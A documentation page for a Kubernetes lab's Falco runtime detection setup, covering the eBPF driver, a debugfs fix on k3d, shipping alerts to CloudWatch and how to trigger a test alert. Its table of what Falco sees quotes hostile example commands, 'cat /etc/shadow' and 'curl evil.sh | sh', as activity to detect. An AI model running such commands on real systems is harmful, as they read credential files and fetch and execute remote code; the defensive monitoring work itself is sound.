# Runtime threat detection (Falco)

[Falco](https://falco.org) watches the kernel's **syscalls** and alerts on
suspicious runtime behaviour — installed as a Helm release by
[`terraform/cluster/falco.tf`](../terraform/cluster/falco.tf).

## Why — the gap the audit log can't fill

The API-server audit log (`/k8s/webapp/audit`) records that someone `exec`'d into
a pod and the *launch* command, but once exec upgrades to a streaming TTY the API
server sees nothing more — **not the commands typed inside the shell, not the
output.** Falco taps `execve` at the kernel, so it sees the shell **and every
command run after it**. That's the whole reason it's here.

| Layer | Sees |
| --- | --- |
| k8s audit (`/k8s/webapp/audit`) | *"system:admin exec'd `bash` into webapp"* |
| **Falco (`/k8s/falco`)** | **`cat /etc/shadow`, `id`, `curl evil.sh \| sh` — the commands inside** |

Falco is **observe-only** (like Trivy Operator): it writes alerts, it never
blocks. It complements Gatekeeper (which blocks at admission).

## Driver: modern eBPF (+ the k3d debugfs catch)

Falco uses the **modern eBPF (CO-RE)** probe — no kernel headers or module
builds. It needs BTF (present on kernel 6.x) and, on **k3d**, one extra thing:

> **k3d nodes don't mount `debugfs`.** Without it the BPF probe can't resolve
> syscall tracepoint IDs and Falco captures *nothing* (you'll see
> `failed to determine tracepoint ... perf event ID` in the logs). So the lab
> mounts it on the node:
> - **fresh cluster:** `null_resource.falco_debugfs` in `falco.tf` mounts it before Falco installs.
> - **after a reboot** (it's on tmpfs, lost on restart — like flannel's `subnet.env`): `scripts/recover.sh` re-mounts it and bounces Falco. `make reboot` covers it.

## Placement

- Runs in its **own `falco` namespace** — the webapp-scoped Gatekeeper constraints
  don't apply, so its privileged DaemonSet is admitted (same as ESO / the shipper).
- Low footprint: no vuln DB, no image pulls beyond the Falco image — none of the
  disk-pressure risk Trivy Operator's scan jobs carry.

## Alerts → CloudWatch

Falco writes JSON alerts to stdout. The `cloudwatch-log-shipper` DaemonSet tails
the Falco pod log and ships it to a **`/k8s/falco`** log group, exactly like the
app and audit streams (see [`logging/cloudwatch-log-shipper.yaml`](../logging/cloudwatch-log-shipper.yaml)):

```
/var/log/pods/falco_*/falco/*.log  ->  /k8s/falco
```

## Test it

### 1. Trigger a detection

The default **"Terminal shell in container"** rule needs a TTY, so exec with `-it`:

```bash
KC="kubectl --context k3d-webapp-test"
POD=$($KC get pods -n webapp -o jsonpath='{.items[0].metadata.name}')
$KC exec -it -n webapp "$POD" -- sh -c 'id; cat /etc/hostname'
```

### 2. See it in Falco (live, in-cluster)

```bash
kubectl --context k3d-webapp-test logs -n falco -l app.kubernetes.io/name=falco -c falco -f | grep -i 'shell\|Warning\|Notice'
```

You'll get a JSON alert: rule `Terminal shell in container`, MITRE tag `T1059`,
`k8s.ns.name=webapp`, and the exact `proc.cmdline` (`sh -c id; cat /etc/hostname`).

### 3. See it shipped to floci CloudWatch (`/k8s/falco`)

```bash
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_EC2_METADATA_DISABLED=true; unset AWS_PROFILE
EP="aws --endpoint-url=http://localhost:4566 --region us-east-1 --no-cli-pager"
$EP logs filter-log-events --log-group-name /k8s/falco --query 'reverse(events)[].message' --output text | tr '\t' '\n' | python3 -c 'import sys,json,re
for l in sys.stdin:
    m = re.sub(r"^\S+ \w+ \w ", "", l.strip())   # strip CRI prefix: <ts> stdout F
    try: d = json.loads(m)
    except Exception: continue
    of = d.get("output_fields", {})
    print(d.get("time","")[:19], "|", d.get("rule"), "|", of.get("k8s.ns.name"), of.get("k8s.pod.name"), "|", of.get("proc.cmdline"))
'
```

Example output:
```
2026-07-17T23:01:30 | Terminal shell in container | webapp scan-demo-xxxx | sh -c cat /etc/hostname; id
```

> No TTY? A non-interactive `kubectl exec pod -- ls` won't trip the shell rule
> (it needs `proc.tty != 0`). Use `-it`, or `script -qec "kubectl exec -it ..." /dev/null`
> to force a pty from a non-interactive shell.

### Other things Falco catches out of the box

Reading sensitive files (`/etc/shadow`), writing below `/etc` or binary dirs,
package-manager launches in a container, outbound connections to unexpected
ports — all in the default ruleset. Add your own rules by mounting a
`custom_rules.yaml` (chart value `customRules`).

## Where this fits the security story

- **Block at PR** — trivy Gate 4 (image CVEs).
- **Block at admission** — Gatekeeper (insecure pods).
- **Observe images at runtime** — Trivy Operator (what's deployed).
- **Observe *behaviour* at runtime** — **Falco** (what a process actually does).

Maps to NIST **SI-4** (system monitoring) and **AU-2/AU-12** (audit of the
in-container activity the API audit log can't see).
